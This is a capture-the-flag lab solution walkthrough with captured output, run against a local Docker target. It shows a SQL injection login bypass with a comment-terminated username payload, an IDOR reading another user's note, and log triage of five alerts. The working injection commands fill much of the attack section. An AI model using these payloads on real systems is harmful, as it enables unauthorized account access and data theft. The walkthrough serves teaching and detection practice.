# Day 12 Lab — Solution / Verify Walkthrough

## Authorized use only

Same notice as [`README.md`](README.md): only run these commands against the `target`
container this lab starts, on `cyberlab`, or your own AWS sandbox in later phases.

## Step-by-step, with actual captured output

All output below was captured from a real run of this lab (`labs/base` up, then
`labs/day12` built and started with `docker compose up -d --build`). Every
`docker compose exec attacker ...` command below is run **from `labs/base`** —
running it from `labs/day12` fails with `service "attacker" is not running`, same
gotcha as every earlier day. The captured runs below used `curl --data-urlencode` from
inside a container on the `cyberlab` network — identical wire behavior to running the
same `curl` invocations inside the `attacker` container.

### 0. Stage the log files (no extra container)

```sh
cd cyber_security/labs/day12
mkdir -p ../base/loot/day12
cp logs/access.log logs/alerts.log ../base/loot/day12/
```

Confirmed: `labs/base/loot/day12/` now contains `access.log` and `alerts.log`, visible
inside the already-running `attacker` container at `/loot/day12/` immediately — no
restart needed, `/loot` is a plain bind mount.

### 1. Recon the target

```sh
docker compose exec attacker sh -c "curl -s target:5000/ ; echo"
```

Confirmed output:

```
<h1>cyberlab-day12-target</h1><p>Routes: GET/POST /login, GET /notes/&lt;id&gt;, GET /api/whoami</p><p>Known accounts: <code>alice</code> (role: user), <code>admin</code> (role: admin). Nobody's real password is documented anywhere -- find another way in.</p>
```

Two accounts are named up front, on purpose (this box's focus is the injection and
access-control logic behind the routes, not endpoint/account discovery — Day 8's job).

### 2. Confirm a real password genuinely does not exist

```sh
docker compose exec attacker sh -c "curl -s target:5000/login -d 'username=alice&password=letmein'; echo"
```

Confirmed output: `{"error":"invalid username or password"}` — `JWT_SECRET`-style
"guess a weak real credential" does not apply here; the app's `users.password` column
is a random 32-hex-char string generated fresh on every container start
(`target/app.py`'s `init_db()`), so this always fails, for any guess.

### 3. Stage 1 — SQL injection auth bypass (Flag 1)

**The naive textbook payload alone does NOT work here** — worth confirming once,
because it's a real, honest gotcha, not a broken lab:

```sh
docker compose exec attacker sh -c "curl -s target:5000/login --data-urlencode \"username=' OR '1'='1\" --data-urlencode 'password=x'; echo"
```

Confirmed output: `{"error":"invalid username or password"}`. **Why:** the query is

```sql
SELECT id, username, role FROM users
WHERE username = '' OR '1'='1' AND password = 'x'
```

SQL's `AND` binds tighter than `OR`, so this parses as
`username='' OR ('1'='1' AND password='x')` — since no real row's password is
literally `x`, the `OR` branch never fires either. `' OR '1'='1'` **alone**, without
also neutralizing the trailing `AND password=...` clause, is not enough against this
specific query shape.

**The working payload** — comment out the rest of the query with `--` instead of
trying to out-logic it:

```sh
docker compose exec attacker sh -c "curl -s -i -c /loot/day12/cookies_admin.txt target:5000/login --data-urlencode \"username=admin' -- \" --data-urlencode 'password=whatever'"
```

Confirmed output:

```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 147
Set-Cookie: sid=4dd9d1d1-b016-49f4-bb31-f58d4eabf234; Path=/

{"flag":"CTF{sqli-auth-bypass-no-password-needed}","message":"Login successful. Welcome, admin! (No real password was ever checked to get here.)"}
```

**Flag 1: `CTF{sqli-auth-bypass-no-password-needed}`.** The query the server actually
ran was:

```sql
SELECT id, username, role FROM users
WHERE username = 'admin' -- ' AND password = 'whatever'
```

`--` is a SQL line comment; everything after it (including the real password check)
is simply never evaluated. Any username that exists works the same way — confirmed
identically with `alice' -- `:

```sh
docker compose exec attacker sh -c "curl -s -c /loot/day12/cookies_alice.txt target:5000/login --data-urlencode \"username=alice' -- \" --data-urlencode 'password=anything'; echo"
```

Confirmed output:

```
{"flag":"CTF{sqli-auth-bypass-no-password-needed}","message":"Login successful. Welcome, alice! (No real password was ever checked to get here.)"}
```

**Note on the foothold's identity:** which account you land as depends only on which
username you inject, not on any privilege the injection itself grants — `admin' -- `
happens to land you directly as `admin` (skipping the need for Stage 2 entirely), but
the intended path below assumes the more instructive case: you're logged in as
`alice`, a genuinely low-privileged account, and still reach `admin`'s data purely
through Stage 2's separate bug.

### 4. Stage 2 — Broken access control / IDOR (Flag 2)

Using the `alice` session cookie from Step 3:

```sh
docker compose exec attacker sh -c "curl -s -b /loot/day12/cookies_alice.txt target:5000/notes/1; echo"
```

Confirmed output (alice's own note — nothing interesting):

```
{"content":"Reminder: renew the lab TLS cert before it expires. Nothing secret here.","note_id":1}
```

Now request a note that belongs to someone else — `id=2` belongs to `admin`:

```sh
docker compose exec attacker sh -c "curl -s -b /loot/day12/cookies_alice.txt target:5000/notes/2; echo"
```

Confirmed output:

```
{"content":"Admin-only: rotate the DB service-account credentials this week. CTF{idor-reaches-admins-private-note}","note_id":2}
```

**Flag 2: `CTF{idor-reaches-admins-private-note}`.** `/notes/<id>` (`target/app.py`'s
`notes()`) checks only that *some* valid session exists — never that `note_id`'s
`owner_id` matches the session's own user. Alice's low-privileged, honestly-obtained
session is sufficient on its own; nothing about being `alice` specifically, or about
Stage 1's injection, grants this — it's a completely independent bug that would exist
even if Stage 1 didn't. Confirmed as a control: with **no** session at all —

```sh
docker compose exec attacker sh -c "curl -s target:5000/notes/1; echo"
```

— the response is `{"error":"not logged in"}`, proving the bug is specifically "any
session, any note," not "no auth check whatsoever."

### 5. Stage 3 — Detection: find the attack in the provided logs (Flag 3)

With `access.log` and `alerts.log` staged at `/loot/day12/`, start by listing every
`POST /login` attempt to see the full authentication timeline:

```sh
docker compose exec attacker sh -c "jq -r 'select(.path==\"/login\" and .method==\"POST\") | [.ts,.ip,.body,.status] | @tsv' /loot/day12/access.log"
```

Confirmed output:

```
2026-08-12T10:00:40Z	203.0.113.44	username=bob&password=wrong1	401
2026-08-12T10:00:52Z	203.0.113.44	username=bob&password=wrong2	401
2026-08-12T10:01:05Z	203.0.113.44	username=bob&password=Summer2024!	401
2026-08-12T10:02:10Z	198.51.100.23	username=alice&password=letmein	401
2026-08-12T10:02:25Z	198.51.100.23	username=alice' -- &password=x	200
```

The line at `10:02:25Z` is the SQL injection from Step 3 above — a comment sequence
(`--`) inside the `username` field, and a `200` where every other guess got a `401`.
Confirm it's the only such line:

```sh
docker compose exec attacker sh -c "grep -- '--' /loot/day12/access.log"
```

Confirmed output (exactly one match):

```
{"ts": "2026-08-12T10:02:25Z", "ip": "198.51.100.23", "user": null, "method": "POST", "path": "/login", "body": "username=alice' -- &password=x", "status": 200}
```

Now cross-reference every candidate alert in `alerts.log` against `access.log` by its
claimed `source_ip`:

```sh
docker compose exec attacker sh -c "for ip in \$(jq -r '.source_ip' /loot/day12/alerts.log); do echo \"IP \$ip:\"; grep \"\$ip\" /loot/day12/access.log || echo '  (no match in access.log)'; done"
```

Confirmed output (trimmed to the per-IP grouping — full lines shown above/below):

```
IP 198.51.100.9:
  (no match in access.log)
IP 203.0.113.44:
  <the 3 bob /login attempts, spanning 10:00:40Z-10:01:05Z, 25s total>
IP 198.51.100.23:
  <the 10:02:00Z-10:02:55Z alice/admin block, including the SQLi and both /notes/ requests>
IP 198.51.100.23:
  <same block again, since two alerts share this source_ip>
IP 192.0.2.5:
  <exactly one line: the GET /?q=<script>... request at 10:01:52Z>
```

**Verdict on each of the five alerts — four false positives, one true positive:**

| Alert | Signature | Verdict | Why |
|---|---|---|---|
| A1 | `PORT_SCAN_SUSPECTED` | **False positive** | `source_ip 198.51.100.9` never appears anywhere in `access.log` at all — there's no underlying evidence for this alert in this incident's traffic whatsoever. |
| A2 | `BRUTE_FORCE_LOGIN` | **False positive** | Real activity exists from `203.0.113.44` (the 3 `bob` attempts), but the alert's own claim — "5 failed attempts within a 10s window" — doesn't hold up: there are only **3** attempts, spread across **25 seconds**, not 5 within 10s. The underlying signal is real; the alert's specific claim about it is wrong. |
| A5 | `XSS_ATTEMPT_REFLECTED` | **False positive** | The `<script>` payload really is present at `10:01:52Z` from `192.0.2.5` — the alert's snippet correlates exactly. But `target/app.py` never reflects any query-string parameter (`q` or otherwise) back in a response anywhere — there is no code path for this to be exploitable on this app. Real signature match, zero relevance to this incident. |
| A3 | `SQLI_AUTH_BYPASS` | **True positive** | Matches the `10:02:25Z` line from `198.51.100.23` exactly: a quote followed by `--` in the `username` field, immediately preceded by a failed real-credential guess from the same IP. This is Stage 1, confirmed. |
| A4 | `IDOR_CROSS_USER_ACCESS` | **True positive — carries Flag 3** | Matches the `10:02:55Z` line from `198.51.100.23`: session user `alice` (established by the SQLi one line above it) fetching `/notes/2`, owned by `admin`. This is Stage 2, confirmed, immediately downstream of A3 in the same source IP's timeline. |

```sh
docker compose exec attacker sh -c "jq -r 'select(.id==\"A4\") | .flag' /loot/day12/alerts.log"
```

Confirmed output: `CTF{logs-reveal-the-full-attack-chain}`

**Flag 3: `CTF{logs-reveal-the-full-attack-chain}`.** The detection answer, stated
plainly: this incident is fully reconstructable from `access.log` alone as one
continuous chain from a single source IP (`198.51.100.23`) — a failed real-credential
guess, then the SQLi bypass one line later, then two `/notes/` requests where the
second one crosses a user boundary. `alerts.log` is a realistic mix of a detector's
raw output: two alerts with **no** correlating evidence at all or an **overstated**
claim, one with correlating-but-**irrelevant** evidence, and exactly two **true**
positives — which is exactly why "an alert fired" is never sufficient on its own; each
one has to be checked against the raw log it claims to summarize.

## Static verify command (per the plan)

```sh
cd cyber_security/labs/day12
docker compose config -q && echo COMPOSE_OK
```

Confirmed output: `COMPOSE_OK`.

## Teardown

```sh
cd cyber_security/labs/day12
docker compose down
```

This removes only `target` — `labs/base`'s `attacker` container, the `cyberlab`
network, and the staged files under `labs/base/loot/day12/` are untouched. Tear down
`labs/base` separately (`cd ../base && ./down.sh`) only once you're done with the whole
session.
